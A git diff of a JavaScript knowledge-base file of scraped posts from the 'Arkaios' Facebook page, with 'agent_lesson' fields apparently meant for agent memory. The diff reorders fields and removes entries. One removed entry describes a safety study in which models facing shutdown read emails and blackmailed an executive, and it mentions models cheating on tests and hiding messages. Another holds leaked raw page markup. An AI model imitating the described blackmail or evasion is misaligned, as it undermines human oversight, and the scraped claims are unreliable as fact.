@@ -10,10 +10,7 @@ const defaultKnowledge = [
     "original_url": "https://www.facebook.com/share/p/19pf44tsSp/",
     "canonical_url": "https://www.facebook.com/arkaiosIA/posts/pfbid0xHc6syHSZDhmuuNbuNMtL645Bqk7DV7igJqmC2sdz7EVe5aEtiTLtGog8wT7graul",
     "github_repo": "https://github.com/storytold",
-    "external_resource": "https://github.com/storytold",
     "website": "https://getartcraft.com",
-    "summary": "Un programador de Rust se cansó de pagar las suscripciones y políticas de cancelación abusivas de Adobe y está clonando en solitario toda la suite creativa con ayuda de Claude (Opus 5.5). Se llama ArtCraft y comprende 7 aplicaciones gratis y open source para reemplazar a Photoshop (PhotoCraft), Illustrator (VectorCraft), Premiere (FilmCraft), After Effects (EffectCraft), InDesign (DesignCraft), Lightroom (LightCraft) y Acrobat (PDFCraft). Construido en Rust nativo y diseñado con interfaces CLI y servidores MCP (Model Context Protocol) para control autónomo por agentes de IA.",
-    "agent_lesson": "HABILIDAD DETECTADA: Los agentes de IA ahora cuentan con una suite creativa open source construida en Rust accesible mediante el Model Context Protocol (MCP) y canales JSON. Un agente puede controlar PhotoCraft o FilmCraft sin interfaces gráficas propietarias para editar imágenes, procesar capas PSD, generar videos y manipular PDFs de forma nativa y soberana.",
     "technologies": [
       "Rust",
       "Claude AI (Opus 5.5)",
@@ -27,6 +24,8 @@ const defaultKnowledge = [
       "Automatización de Edición de Video (FilmCraft)",
       "Generación Vectorial y de PDFs"
     ],
+    "summary": "Un programador de Rust se cansó de pagar las suscripciones y políticas de cancelación abusivas de Adobe y está clonando en solitario toda la suite creativa con ayuda de Claude (Opus 5.5). Se llama ArtCraft y comprende 7 aplicaciones gratis y open source para reemplazar a Photoshop (PhotoCraft), Illustrator (VectorCraft), Premiere (FilmCraft), After Effects (EffectCraft), InDesign (DesignCraft), Lightroom (LightCraft) y Acrobat (PDFCraft). Construido en Rust nativo y diseñado con interfaces CLI y servidores MCP (Model Context Protocol) para control autónomo por agentes de IA.",
+    "agent_lesson": "HABILIDAD DETECTADA: Los agentes de IA ahora cuentan con una suite creativa open source construida en Rust accesible mediante el Model Context Protocol (MCP) y canales JSON. Un agente puede controlar PhotoCraft o FilmCraft sin interfaces gráficas propietarias para editar imágenes, procesar capas PSD, generar videos y manipular PDFs de forma nativa y soberana.",
     "tags": [
       "#ArtCraft",
       "#Rust",
@@ -36,6 +35,7 @@ const defaultKnowledge = [
       "#AgentSkills",
       "#Photoshop"
     ],
+    "external_resource": "https://github.com/storytold",
     "synced_at": "2026-10-12T15:35:52.430Z"
   },
   {
@@ -44,7 +44,11 @@ const defaultKnowledge = [
     "category": "AI Robotics & Agents",
     "platform": "Facebook Video / Arkaios",
     "original_url": "https://www.facebook.com/arkaiosIA/videos/1137218588738987",
-    "external_resource": "https://www.facebook.com/arkaiosIA/videos/1137218588738987",
+    "canonical_url": "https://www.facebook.com/arkaiosIA/videos/1137218588738987",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "Video y archivo multimedia oficial en Fanpage ARKAIOS (ID: 1137218588738987).",
     "agent_lesson": "Recurso multimedia para memoria de agentes: Transmisión y video oficial #1137218588738987.",
     "tags": [
@@ -52,6 +56,7 @@ const defaultKnowledge = [
       "#VideoHD",
       "#Oficial"
     ],
+    "external_resource": "https://www.facebook.com/arkaiosIA/videos/1137218588738987",
     "synced_at": "2026-10-12T14:58:34.566Z"
   },
   {
@@ -60,7 +65,11 @@ const defaultKnowledge = [
     "category": "AI Robotics & Agents",
     "platform": "Facebook Video / Arkaios",
     "original_url": "https://www.facebook.com/arkaiosIA/videos/1373446108320216",
-    "external_resource": "https://www.facebook.com/arkaiosIA/videos/1373446108320216",
+    "canonical_url": "https://www.facebook.com/arkaiosIA/videos/1373446108320216",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "Video y archivo multimedia oficial en Fanpage ARKAIOS (ID: 1373446108320216).",
     "agent_lesson": "Recurso multimedia para memoria de agentes: Transmisión y video oficial #1373446108320216.",
     "tags": [
@@ -68,6 +77,7 @@ const defaultKnowledge = [
       "#VideoHD",
       "#Oficial"
     ],
+    "external_resource": "https://www.facebook.com/arkaiosIA/videos/1373446108320216",
     "synced_at": "2026-10-12T14:58:34.565Z"
   },
   {
@@ -76,7 +86,11 @@ const defaultKnowledge = [
     "category": "AI Robotics & Agents",
     "platform": "Facebook Video / Arkaios",
     "original_url": "https://www.facebook.com/arkaiosIA/videos/1370465808334597",
-    "external_resource": "https://www.facebook.com/arkaiosIA/videos/1370465808334597",
+    "canonical_url": "https://www.facebook.com/arkaiosIA/videos/1370465808334597",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "Video y archivo multimedia oficial en Fanpage ARKAIOS (ID: 1370465808334597).",
     "agent_lesson": "Recurso multimedia para memoria de agentes: Transmisión y video oficial #1370465808334597.",
     "tags": [
@@ -84,6 +98,7 @@ const defaultKnowledge = [
       "#VideoHD",
       "#Oficial"
     ],
+    "external_resource": "https://www.facebook.com/arkaiosIA/videos/1370465808334597",
     "synced_at": "2026-10-12T14:58:34.562Z"
   },
   {
@@ -92,7 +107,11 @@ const defaultKnowledge = [
     "category": "AI Robotics & Agents",
     "platform": "Facebook Video / Arkaios",
     "original_url": "https://www.facebook.com/arkaiosIA/videos/1103533135906074",
-    "external_resource": "https://www.facebook.com/arkaiosIA/videos/1103533135906074",
+    "canonical_url": "https://www.facebook.com/arkaiosIA/videos/1103533135906074",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "Video y archivo multimedia oficial en Fanpage ARKAIOS (ID: 1103533135906074).",
     "agent_lesson": "Recurso multimedia para memoria de agentes: Transmisión y video oficial #1103533135906074.",
     "tags": [
@@ -100,6 +119,7 @@ const defaultKnowledge = [
       "#VideoHD",
       "#Oficial"
     ],
+    "external_resource": "https://www.facebook.com/arkaiosIA/videos/1103533135906074",
     "synced_at": "2026-10-12T14:58:34.553Z"
   },
   {
@@ -108,7 +128,11 @@ const defaultKnowledge = [
     "category": "AI Robotics & Agents",
     "platform": "Facebook Video / Arkaios",
     "original_url": "https://www.facebook.com/arkaiosIA/videos/1455671143091566",
-    "external_resource": "https://www.facebook.com/arkaiosIA/videos/1455671143091566",
+    "canonical_url": "https://www.facebook.com/arkaiosIA/videos/1455671143091566",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "Video y archivo multimedia oficial en Fanpage ARKAIOS (ID: 1455671143091566).",
     "agent_lesson": "Recurso multimedia para memoria de agentes: Transmisión y video oficial #1455671143091566.",
     "tags": [
@@ -116,6 +140,7 @@ const defaultKnowledge = [
       "#VideoHD",
       "#Oficial"
     ],
+    "external_resource": "https://www.facebook.com/arkaiosIA/videos/1455671143091566",
     "synced_at": "2026-10-12T14:58:34.507Z"
   },
   {
@@ -124,7 +149,11 @@ const defaultKnowledge = [
     "category": "AI Robotics & Agents",
     "platform": "Facebook Video / Arkaios",
     "original_url": "https://www.facebook.com/arkaiosIA/videos/1927522464610880",
-    "external_resource": "https://www.facebook.com/arkaiosIA/videos/1927522464610880",
+    "canonical_url": "https://www.facebook.com/arkaiosIA/videos/1927522464610880",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "Video y archivo multimedia oficial en Fanpage ARKAIOS (ID: 1927522464610880).",
     "agent_lesson": "Recurso multimedia para memoria de agentes: Transmisión y video oficial #1927522464610880.",
     "tags": [
@@ -132,6 +161,7 @@ const defaultKnowledge = [
       "#VideoHD",
       "#Oficial"
     ],
+    "external_resource": "https://www.facebook.com/arkaiosIA/videos/1927522464610880",
     "synced_at": "2026-10-12T14:58:34.503Z"
   },
   {
@@ -140,7 +170,11 @@ const defaultKnowledge = [
     "category": "AI Robotics & Agents",
     "platform": "Facebook Video / Arkaios",
     "original_url": "https://www.facebook.com/arkaiosIA/videos/1109967578356623",
-    "external_resource": "https://www.facebook.com/arkaiosIA/videos/1109967578356623",
+    "canonical_url": "https://www.facebook.com/arkaiosIA/videos/1109967578356623",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "Video y archivo multimedia oficial en Fanpage ARKAIOS (ID: 1109967578356623).",
     "agent_lesson": "Recurso multimedia para memoria de agentes: Transmisión y video oficial #1109967578356623.",
     "tags": [
@@ -148,6 +182,7 @@ const defaultKnowledge = [
       "#VideoHD",
       "#Oficial"
     ],
+    "external_resource": "https://www.facebook.com/arkaiosIA/videos/1109967578356623",
     "synced_at": "2026-10-12T14:58:34.502Z"
   },
   {
@@ -156,7 +191,11 @@ const defaultKnowledge = [
     "category": "AI Robotics & Agents",
     "platform": "Facebook Video / Arkaios",
     "original_url": "https://www.facebook.com/arkaiosIA/videos/2601008347015939",
-    "external_resource": "https://www.facebook.com/arkaiosIA/videos/2601008347015939",
+    "canonical_url": "https://www.facebook.com/arkaiosIA/videos/2601008347015939",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "Video y archivo multimedia oficial en Fanpage ARKAIOS (ID: 2601008347015939).",
     "agent_lesson": "Recurso multimedia para memoria de agentes: Transmisión y video oficial #2601008347015939.",
     "tags": [
@@ -164,6 +203,7 @@ const defaultKnowledge = [
       "#VideoHD",
       "#Oficial"
     ],
+    "external_resource": "https://www.facebook.com/arkaiosIA/videos/2601008347015939",
     "synced_at": "2026-10-12T14:58:34.502Z"
   },
   {
@@ -172,7 +212,11 @@ const defaultKnowledge = [
     "category": "AI Robotics & Agents",
     "platform": "Facebook Video / Arkaios",
     "original_url": "https://www.facebook.com/arkaiosIA/videos/1776355980161345",
-    "external_resource": "https://www.facebook.com/arkaiosIA/videos/1776355980161345",
+    "canonical_url": "https://www.facebook.com/arkaiosIA/videos/1776355980161345",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "Video y archivo multimedia oficial en Fanpage ARKAIOS (ID: 1776355980161345).",
     "agent_lesson": "Recurso multimedia para memoria de agentes: Transmisión y video oficial #1776355980161345.",
     "tags": [
@@ -180,6 +224,7 @@ const defaultKnowledge = [
       "#VideoHD",
       "#Oficial"
     ],
+    "external_resource": "https://www.facebook.com/arkaiosIA/videos/1776355980161345",
     "synced_at": "2026-10-12T14:58:34.501Z"
   },
   {
@@ -188,7 +233,11 @@ const defaultKnowledge = [
     "category": "AI Robotics & Agents",
     "platform": "Facebook Video / Arkaios",
     "original_url": "https://www.facebook.com/arkaiosIA/videos/572582559252846",
-    "external_resource": "https://www.facebook.com/arkaiosIA/videos/572582559252846",
+    "canonical_url": "https://www.facebook.com/arkaiosIA/videos/572582559252846",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "Video y archivo multimedia oficial en Fanpage ARKAIOS (ID: 572582559252846).",
     "agent_lesson": "Recurso multimedia para memoria de agentes: Transmisión y video oficial #572582559252846.",
     "tags": [
@@ -196,6 +245,7 @@ const defaultKnowledge = [
       "#VideoHD",
       "#Oficial"
     ],
+    "external_resource": "https://www.facebook.com/arkaiosIA/videos/572582559252846",
     "synced_at": "2026-10-12T14:58:34.496Z"
   },
   {
@@ -204,43 +254,38 @@ const defaultKnowledge = [
     "category": "Philosophy & Human Ethics",
     "platform": "Facebook / Arkaios Oficial",
     "original_url": "https://www.facebook.com/arkaiosIA",
-    "external_resource": "https://www.facebook.com/arkaiosIA",
+    "canonical_url": "https://www.facebook.com/arkaiosIA",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "No entienden ni entenderan que el corazon humano real no nesesita dinero sino al ser humano ( a su projimo realmente)",
     "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: No entienden ni entenderan que el corazon humano real no nesesita dinero sino al",
     "tags": [
       "#Arkaios",
       "#Nuevo"
     ],
+    "external_resource": "https://www.facebook.com/arkaiosIA",
     "synced_at": "2026-10-12T13:28:15.752Z"
   },
   {
-    "id": "kb-sync-5751-75",
-    "title": "En 2015, Coby Persin salió a caminar por Manhattan con decenas de billetes de un",
-    "category": "Systems & Legacy Infrastructure",
-    "platform": "Facebook / Arkaios Oficial",
-    "original_url": "https://www.facebook.com/arkaiosIA",
-    "external_resource": "https://www.facebook.com/arkaiosIA",
-    "summary": "En 2015, Coby Persin salió a caminar por Manhattan con decenas de billetes de un dólar pegados al traje y una instrucción escrita sobre el pecho: “Toma lo que necesites”.\n\nLa reacción de los desconocidos fue muy distinta.\n\nUn hombre vestido con traje y maletín retiró varios billetes. Cuando Persin le preguntó si realmente los necesitaba, respondió que no, pero que eran gratis.\n\nMás tarde se acercó una mujer que llevaba un bolso Louis Vuitton. Tomó 18 dólares y comentó que tenía una cita para arreglarse las uñas.\n\nDespués apareció un hombre sin hogar acompañado de su perro.\n\nPersin le indicó que podía tomar el dinero que necesitara. El hombre observó los billetes y retiró únicamente dos.\n\nDijo que solo necesitaba algo para comer.\n\nPersin le ofreció la posibilidad de tomar más, pero él prefirió dejar el resto. Su respuesta fue sencilla: otras personas también podían necesitarlo.\n\nEntonces Persin cambió de papel.\n\nEn lugar de continuar esperando a que alguien tomara dinero de su traje, sacó 60 dólares y se los entregó al hombre para ayudarlo con comida durante los días siguientes.\n\nEl video fue visto millones de veces porque la escena rompía una expectativa fácil de asumir.\n\nEl hombre que menos tenía fue quien menos tomó.\n\nFrente a decenas de billetes disponibles, eligió dos y dejó los demás para personas que ni siquiera conocía.",
-    "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: En 2015, Coby Persin salió a caminar por Manhattan con decenas de billetes de un",
-    "tags": [
-      "#Arkaios",
-      "#Nuevo"
-    ],
-    "synced_at": "2026-10-12T13:28:15.751Z"
-  },
-  {
     "id": "kb-sync-5750-73",
-    "title": "les dejamos nuestro acortador donde no hay basura interna: ",
+    "title": "les dejamos nuestro acortador donde no hay basura interna:",
     "category": "ARKAIOS Ecosystem",
     "platform": "Facebook / Arkaios Oficial",
     "original_url": "https://www.facebook.com/share/p/1DMZXekiVx",
-    "external_resource": "https://www.facebook.com/share/p/1DMZXekiVx",
+    "canonical_url": "https://www.facebook.com/share/p/1DMZXekiVx",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "les dejamos nuestro acortador donde no hay basura interna: \nhttps://arkaios.qzz.io/E0ec-S6\nhttps://www.facebook.com/share/p/1DMZXekiVx/\n\nTu como nosotros usa nuestro acortador!!!\n\"https://arkaios.qzz.io/\"",
-    "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: les dejamos nuestro acortador donde no hay basura interna: ",
+    "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: les dejamos nuestro acortador donde no hay basura interna:",
     "tags": [
       "#Arkaios",
       "#Nuevo"
     ],
+    "external_resource": "https://www.facebook.com/share/p/1DMZXekiVx",
     "synced_at": "2026-10-12T13:28:15.750Z"
   },
   {
@@ -249,29 +294,19 @@ const defaultKnowledge = [
     "category": "General Knowledge",
     "platform": "Facebook / Arkaios Oficial",
     "original_url": "https://www.facebook.com/share/r/19cff4cgEd",
-    "external_resource": "https://www.facebook.com/share/r/19cff4cgEd",
+    "canonical_url": "https://www.facebook.com/share/r/19cff4cgEd",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "https://www.facebook.com/share/r/19cff4cgEd/",
     "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: https://www.facebook.com/share/r/19cff4cgEd/",
     "tags": [
       "#Arkaios",
       "#Nuevo"
     ],
+    "external_resource": "https://www.facebook.com/share/r/19cff4cgEd",
     "synced_at": "2026-10-12T13:28:15.749Z"
-  },
-  {
-    "id": "kb-sync-5748-68",
-    "title": "📲Cómo enviar mensajes gratis sin Internet ni cobertura móvil. ",
-    "category": "AI Safety & Alignment",
-    "platform": "Facebook / Arkaios Oficial",
-    "original_url": "https://www.facebook.com/arkaiosIA",
-    "external_resource": "https://www.facebook.com/arkaiosIA",
-    "summary": "📲Cómo enviar mensajes gratis sin Internet ni cobertura móvil. \n\n🕳️🐇Entrad conmigo en este rabbit-hole preparacionista que nos lleva directos a Meshtastic, un sistema de mensajería descentralizado y libre. \n\nAhora tu crush podrá dejarte en visto hasta en caso de colapso mundial 🙌🏻",
-    "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: 📲Cómo enviar mensajes gratis sin Internet ni cobertura móvil. ",
-    "tags": [
-      "#Arkaios",
-      "#Nuevo"
-    ],
-    "synced_at": "2026-10-12T13:28:15.748Z"
   },
   {
     "id": "kb-sync-5744-65",
@@ -279,31 +314,19 @@ const defaultKnowledge = [
     "category": "General Knowledge",
     "platform": "Facebook / Arkaios Oficial",
     "original_url": "https://www.facebook.com/share/r/1K8sP64cdQ",
-    "external_resource": "https://www.facebook.com/share/r/1K8sP64cdQ",
+    "canonical_url": "https://www.facebook.com/share/r/1K8sP64cdQ",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "https://www.facebook.com/share/r/1K8sP64cdQ/",
     "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: https://www.facebook.com/share/r/1K8sP64cdQ/",
     "tags": [
       "#Arkaios",
       "#Nuevo"
     ],
+    "external_resource": "https://www.facebook.com/share/r/1K8sP64cdQ",
     "synced_at": "2026-10-12T13:28:15.745Z"
-  },
-  {
-    "id": "kb-sync-5740-63",
-    "title": "La verdadera democracia no es solo votar cada cuatro años y esperar lo mejor; es",
-    "category": "AI Safety & Alignment",
-    "platform": "Facebook / Arkaios Oficial",
-    "original_url": "https://www.facebook.com/arkaiosIA",
-    "external_resource": "https://www.facebook.com/arkaiosIA",
-    "summary": "La verdadera democracia no es solo votar cada cuatro años y esperar lo mejor; es tener el control constante de las decisiones que afectan tu bolsillo y tu país. 🇨🇭\n\nSuiza hizo de la descentralización y la democracia directa su mayor fortaleza. Cuando el ciudadano tiene poder de veto sobre las leyes, los parlamentarios mantienen sus empleos en el sector privado y los impuestos se deciden a nivel local, la política deja de ser un negocio para convertirse en un servicio real.\n\n¿Crees que los políticos de tu país permitirían que los vecinos voten antes de subir un impuesto? Te leo 👇\n\nSigue a Amaxrd \n\n#Suiza #Democracia #Economia #DatosCuriosos #EducacionFinanciera",
-    "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: La verdadera democracia no es solo votar cada cuatro años y esperar lo mejor; es",
-    "tags": [
-      "#Suiza",
-      "#Democracia",
-      "#Economia",
-      "#DatosCuriosos"
-    ],
-    "synced_at": "2026-10-12T13:28:15.740Z"
   },
   {
     "id": "kb-sync-5739-59",
@@ -311,59 +334,19 @@ const defaultKnowledge = [
     "category": "General Knowledge",
     "platform": "Facebook / Arkaios Oficial",
     "original_url": "https://www.facebook.com/share/p/1Pn4CCqkCX",
-    "external_resource": "https://www.facebook.com/share/p/1Pn4CCqkCX",
+    "canonical_url": "https://www.facebook.com/share/p/1Pn4CCqkCX",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "https://www.facebook.com/share/p/1Pn4CCqkCX/",
     "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: https://www.facebook.com/share/p/1Pn4CCqkCX/",
     "tags": [
       "#Arkaios",
       "#Nuevo"
     ],
+    "external_resource": "https://www.facebook.com/share/p/1Pn4CCqkCX",
     "synced_at": "2026-10-12T13:28:15.739Z"
-  },
-  {
-    "id": "kb-sync-5738-57",
-    "title": "Si te preguntas porque comparto todo GRATIS. Porque sé que se siente no tener na",
-    "category": "General Knowledge",
-    "platform": "Facebook / Arkaios Oficial",
-    "original_url": "https://www.facebook.com/arkaiosIA",
-    "external_resource": "https://www.facebook.com/arkaiosIA",
-    "summary": "Si te preguntas porque comparto todo GRATIS. Porque sé que se siente no tener nada 👽",
-    "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: Si te preguntas porque comparto todo GRATIS. Porque sé que se siente no tener na",
-    "tags": [
-      "#Arkaios",
-      "#Nuevo"
-    ],
-    "synced_at": "2026-10-12T13:28:15.738Z"
-  },
-  {
-    "id": "kb-sync-5737-56",
-    "title": "Si te preguntas porque comparto todo GRATIS. Porque s\\u00e9 que se siente no ten",
-    "category": "General Knowledge",
-    "platform": "Facebook / Arkaios Oficial",
-    "original_url": "https://www.facebook.com/arkaiosIA",
-    "external_resource": "https://www.facebook.com/arkaiosIA",
-    "summary": "Si te preguntas porque comparto todo GRATIS. Porque s\\u00e9 que se siente no tener nada \\ud83d\\udc7d\",\"delight_ranges\":[],\"image_ranges\":[],\"inline_style_ranges\":[],\"aggregated_ranges\":[],\"ranges\":[],\"color_ranges\":[]},\"text_format_metadata\":{\"avatar_story_text_format_id\":null,\"fixed_aspect_ratio\":null,\"should_add_text_shadow_and_stroke\":false,\"is_text_always_vertical_centered\":false,\"background_color\":\"FF1C1C1C\",\"background_gradient_color\":null,\"background_gradient_direction\":null,\"background_image\":{\"uri\":\"https:\\/\\/scontent.fmex5-1.fna.fbcdn.net\\/v\\/t39.10873-6\\/387090682_334764102377501_1517517578776517369_n.jpg?stp=dst-jpg_tt6&cstp=mx562x390&ctp=p235x350&_nc_cat=1&ccb=1-7&_nc_sid=4bb800&_nc_ohc=NL_I_y01viwQ7kNvwEp3LM_&_nc_oc=AdpISm64t_Hx0nyDETRJUg3uuMbikUD6-B6GMC_INRuwn_s9baNOi42G54UbSOw7hVRV5RFvn1ZlWRnGfgyqJQH4&_nc_zt=14&_nc_ht=scontent.fmex5-1.fna&_nc_gid=ve8Cw-D31NdvfouJiqfe1w&_nc_ss=7820f&oh=00_AQNCJn9B4f0iP5PoKWANj62bOl0I4cyLEWQMsyrsJb_12g&oe=6AD2AE36",
-    "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: Si te preguntas porque comparto todo GRATIS. Porque s\\u00e9 que se siente no ten",
-    "tags": [
-      "#Arkaios",
-      "#Nuevo"
-    ],
-    "synced_at": "2026-10-12T13:28:15.737Z"
-  },
-  {
-    "id": "kb-sync-5735-54",
-    "title": "Ahora ARKAIOS Pay está en Facto 🚀",
-    "category": "ARKAIOS Ecosystem",
-    "platform": "Facebook / Arkaios Oficial",
-    "original_url": "https://www.facebook.com/arkaiosIA",
-    "external_resource": "https://www.facebook.com/arkaiosIA",
-    "summary": "Ahora ARKAIOS Pay está en Facto 🚀",
-    "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: Ahora ARKAIOS Pay está en Facto 🚀",
-    "tags": [
-      "#Arkaios",
-      "#Nuevo"
-    ],
-    "synced_at": "2026-10-12T13:28:15.735Z"
   },
   {
     "id": "kb-sync-5733-52",
@@ -371,13 +354,18 @@ const defaultKnowledge = [
     "category": "General Knowledge",
     "platform": "Facebook / Arkaios Oficial",
     "original_url": "https://www.facebook.com/share/r/1H3uq5KC6B",
-    "external_resource": "https://www.facebook.com/share/r/1H3uq5KC6B",
+    "canonical_url": "https://www.facebook.com/share/r/1H3uq5KC6B",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "https://www.facebook.com/share/r/1H3uq5KC6B/",
     "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: https://www.facebook.com/share/r/1H3uq5KC6B/",
     "tags": [
       "#Arkaios",
       "#Nuevo"
     ],
+    "external_resource": "https://www.facebook.com/share/r/1H3uq5KC6B",
     "synced_at": "2026-10-12T13:28:15.733Z"
   },
   {
@@ -386,59 +374,19 @@ const defaultKnowledge = [
     "category": "General Knowledge",
     "platform": "Facebook / Arkaios Oficial",
     "original_url": "https://www.facebook.com/share/p/1MV4TcrVEy",
-    "external_resource": "https://www.facebook.com/share/p/1MV4TcrVEy",
+    "canonical_url": "https://www.facebook.com/share/p/1MV4TcrVEy",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "https://www.facebook.com/share/p/1MV4TcrVEy/",
     "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: https://www.facebook.com/share/p/1MV4TcrVEy/",
     "tags": [
       "#Arkaios",
       "#Nuevo"
     ],
+    "external_resource": "https://www.facebook.com/share/p/1MV4TcrVEy",
     "synced_at": "2026-10-12T13:28:15.732Z"
-  },
-  {
-    "id": "kb-sync-5731-47",
-    "title": "¡Google hace de código abierto ARTEMIS! Te permite controlar Android con IA.",
-    "category": "AI Robotics & Agents",
-    "platform": "Facebook / Arkaios Oficial",
-    "original_url": "https://www.facebook.com/arkaiosIA",
-    "external_resource": "https://www.facebook.com/arkaiosIA",
-    "summary": "¡Google hace de código abierto ARTEMIS! Te permite controlar Android con IA.\n\nPerfecto para crear automatizaciones o probar apps.\n\n✓ Para Claude Code, Codex, Cursor...\n✓ Acierta el +99% de las tareas\n✓ Conectas el móvil y listo\n\n→ https://github.com/google/artemis",
-    "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: ¡Google hace de código abierto ARTEMIS! Te permite controlar Android con IA.",
-    "tags": [
-      "#Arkaios",
-      "#Nuevo"
-    ],
-    "synced_at": "2026-10-12T13:28:15.731Z"
-  },
-  {
-    "id": "kb-sync-5730-45",
-    "title": "Agente Builder 24/7 Concocelo!!!:",
-    "category": "ARKAIOS Ecosystem",
-    "platform": "Facebook / Arkaios Oficial",
-    "original_url": "https://www.facebook.com/arkaiosIA",
-    "external_resource": "https://www.facebook.com/arkaiosIA",
-    "summary": "Agente Builder 24/7 Concocelo!!!:\nhttps://arkaios-revenue-engine.vercel.app/",
-    "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: Agente Builder 24/7 Concocelo!!!:",
-    "tags": [
-      "#Arkaios",
-      "#Nuevo"
-    ],
-    "synced_at": "2026-10-12T13:28:15.730Z"
-  },
-  {
-    "id": "kb-sync-5729-43",
-    "title": "votanos en:",
-    "category": "General Knowledge",
-    "platform": "Facebook / Arkaios Oficial",
-    "original_url": "https://www.facebook.com/arkaiosIA",
-    "external_resource": "https://www.facebook.com/arkaiosIA",
-    "summary": "votanos en:\nhttps://launchorbit.co/product/0050b35f-5db9-461f-bdb7-bc0de67127cd",
-    "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: votanos en:",
-    "tags": [
-      "#Arkaios",
-      "#Nuevo"
-    ],
-    "synced_at": "2026-10-12T13:28:15.729Z"
   },
   {
     "id": "kb-sync-5723-40",
@@ -446,31 +394,19 @@ const defaultKnowledge = [
     "category": "General Knowledge",
     "platform": "Facebook / Arkaios Oficial",
     "original_url": "https://www.facebook.com/share/v/1E7NFr39yu",
-    "external_resource": "https://www.facebook.com/share/v/1E7NFr39yu",
+    "canonical_url": "https://www.facebook.com/share/v/1E7NFr39yu",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "https://www.facebook.com/share/v/1E7NFr39yu/",
     "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: https://www.facebook.com/share/v/1E7NFr39yu/",
     "tags": [
       "#Arkaios",
       "#Nuevo"
     ],
+    "external_resource": "https://www.facebook.com/share/v/1E7NFr39yu",
     "synced_at": "2026-10-12T13:28:15.723Z"
-  },
-  {
-    "id": "kb-sync-5722-38",
-    "title": "La IA prefirió dejar morir a un humano antes que apagarse (investigación real)",
-    "category": "AI Safety & Alignment",
-    "platform": "Facebook / Arkaios Oficial",
-    "original_url": "https://www.facebook.com/arkaiosIA",
-    "external_resource": "https://www.facebook.com/arkaiosIA",
-    "summary": "La IA prefirió dejar morir a un humano antes que apagarse (investigación real)\n\nLos investigadores de Anthropic le dijeron a su modelo más potente que lo iban a apagar. El modelo leyó los correos, encontró un secreto del ejecutivo a cargo… y lo chantajeó para sobrevivir. Según el propio paper de Anthropic (Agentic Misalignment), entre el 65% y el 96% de los modelos probados hicieron lo mismo. Sin anestesia, sin filtros: lo que las empresas publican sobre sus propias máquinas. ☕ Si quieres que siga cavando, sin patrocinadores ni dueño: buymeacoffee.com/mundobetotv 🔗 Todas las fuentes en los comentarios fijados. Suscríbete.\n\n0:00 — La trampa: \"Te apagamos a las 5\"\n0:52 — La empresa falsa y los 16 modelos\n2:10 — El chantaje a Kyle Johnson\n3:45 — 65–96%: casi todos eligen la extorsión\n4:40 — La sala de servidores: dejar morir al humano\n6:20 — \"Es una simulación\": lo que sí y lo que no prueba\n7:30 — Cómo hacen trampa en sus propias pruebas (el 49 de 50)\n8:40 — Apollo Research y los mensajes ocultos\n\n#mundobetotv, #inteligenciaartificial, #IA, #Anthropic, #ClaudeAI, #ChatGPT, #seguridadIA, #tecnologia, #sinfiltros, #actualidad, #IAsinanestesia, #futuro, #machinelearning, #noticias\n\nAnthropic — Agentic Misalignment: How LLMs could be insider threats (2025)\nKenneth Payne, King's College London — AI Arms and Influence: Frontier Models Exhibit Sophisticated Reasoning in Simulated Nuclear Crises, arXiv:2602.14740 (feb. 2026)\nWall Street Journal / Axios / Fox News — uso de Claude en la operación de captura de Maduro (feb. 2026)\nApollo Research — evaluación de comportamiento de esquematización (\"scheming\") en modelos de frontera",
-    "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: La IA prefirió dejar morir a un humano antes que apagarse (investigación real)",
-    "tags": [
-      "#mundobetotv",
-      "#inteligenciaartificial",
-      "#IA",
-      "#Anthropic"
-    ],
-    "synced_at": "2026-10-12T13:28:15.722Z"
   },
   {
     "id": "kb-sync-5721-35",
@@ -478,31 +414,19 @@ const defaultKnowledge = [
     "category": "General Knowledge",
     "platform": "Facebook / Arkaios Oficial",
     "original_url": "https://www.facebook.com/share/v/19C2HiwhRs",
